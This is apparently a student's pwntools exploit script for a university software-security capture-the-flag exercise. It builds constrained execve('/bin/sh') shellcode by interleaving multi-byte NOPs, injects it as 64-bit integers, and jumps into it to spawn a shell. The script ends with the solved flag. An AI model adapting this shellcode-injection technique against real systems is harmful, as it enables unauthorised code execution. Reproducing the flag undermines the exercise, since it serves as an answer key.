import pwn

# Feedback: I really struggeled executing this one. I found the vulnerability after 20 Minutes. But coming up with shellcode was really challenging. In total it took slighly over 3 hours. I feel that this is too much after finding the vulnerability. It does not feel rewarding finding a random instruction that meets the requirements at all. Would be a really back exam question to solve under pressure in my humble opinion.


# python3 -m venv pwn_env
# source pwn_env/bin/activate
# pip install --upgrade pip
# pip install pwntools

pwn.context.arch = 'amd64'

# docker compose -f debug.yml up
# docker exec -ti "$(docker ps -q -f 'ancestor=softsec/debug/practice-1')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'
#conn = pwn.remote('tasks.ws24.softsec.rub.de', 33256)
conn = pwn.remote('127.0.0.1', 1024)

# we can write own own shellcode that gets executed

pwn.pause()

# number is 8Byte unsigned long (64bit number)
# we need to provide then number as a decimal, that has 29 digits at most (that is enough for all numbers)

# there are 4096 Bytes 

# that means we can just write shellcode , but

# we can write 8 bytes, than 2 bytes junk
# 8 bytes: XX XX XX XX XX XX XX XX 48 b8 

# i want this shellcode
shellcode = pwn.asm('''
    mov rax, 59;
    lea rdi, [rip + sh];
    mov rsi, 0;
    mov rdx, 0;
    syscall;
    ret;
sh:
    .string "/bin/sh"
''')

# we can only load 64-bit values into register
# we can jump to an offset, so misinterpret instructions, by starting at odd address

# we start at byte 3, then we have 8 bytes of our choice, 2 junk, 8 bytes, 2 junk,...
#lea rdi, [rip + sh];
shellcode = pwn.asm('''
    lea rdi, [rip + sh];
                    
    push 0xb848; // junk to meet requirements
    
    xor eax, eax;      
    nop;
    nop;
    nop;
    push 0xb848;

    mov ax, 59;
                    
    nop;         // junk to meet requirements
    push 0xb848;
                    
    mov si, 0;
                    
    nop;         // junk to meet requirements
    push 0xb848;   
                          
    mov dx, 0;
                    
    nop;         // junk to meet requirements
    push 0xb848;     

    syscall;
                    
junk:
    .byte 0x48, 0xb8, 0x48, 0xb8, 0x48, 0xb8, 0x48

sh:
    .string "/bin/sh"
''')


# use the multi byte nop (0F 1F XX XX) => two bytes fix then 2 arbitrary bytes
shellcode = pwn.asm('''    
    xor rax, rax ; # 3 bytes:
    nop;           # 1 byte:
    nop;
    nop;
    nop DWORD PTR [rax - 0x48]; # byte code:  0f1f40b8 (0F 1F encodeds the nop instruction, then 4 arbitrary bytes, here 40 for memory addressing mode and B8=-0x48 for displacement)

    add rax, 59;
    nop;
    nop;
    nop DWORD PTR [rax - 0x48];
    push 0xaaaaaaa;
    pop rdi;
    nop DWORD PTR [rax - 0x48];
    shl rdi, 12;
    nop;
    nop;
    nop DWORD PTR [rax - 0x48];
    add rdi, 0x3e;
    nop;
    nop;
    nop DWORD PTR [rax - 0x48];
    syscall;
    nop;
    nop;   
    nop;
    nop;
    nop DWORD PTR [rax - 0x48];         
sh:
    .string "/bin/sh";
''')


print(f'shellcode: {shellcode.hex()}')
bytes_to_send = list()

# check that output is valid
for i in range(0, len(shellcode), 10):
    chunk = shellcode[i:i+8]
    bytes_to_send.append(chunk)
    junk = shellcode[i+8:i+10]
    print(f'{chunk.hex()} || {junk.hex()}')

print(bytes_to_send)

conn.recvuntil(b'How many numbers do you need? ')
conn.sendline(b'7')

for chunk in bytes_to_send:
    # we want the bytes like this in memory:
    print(chunk.hex())
    # we can write 8 bytes at a time as number which is stored in little endien
    # get integer
    chunk_integer = pwn.u64(chunk)
    #chunk_integer = int(chunk.hex(), 16)
    print(hex(chunk_integer))
    print(str(f'{chunk_integer}').encode('utf-8'))
    conn.recvuntil(b': ')
    conn.sendline(str(f'{chunk_integer}').encode('utf-8'))
    
# start of offset 2 to trigger my code
conn.sendlineafter(b'Enter an offset to jump to: ', b'2')

# enjoy your shell :)
conn.interactive()

# softsec{mPoQ1hpTMM9mu-QFIBwCEvBQLIYYsXIPkI2l3d53LUgoRF4plojnJDXw5uy0JN7e}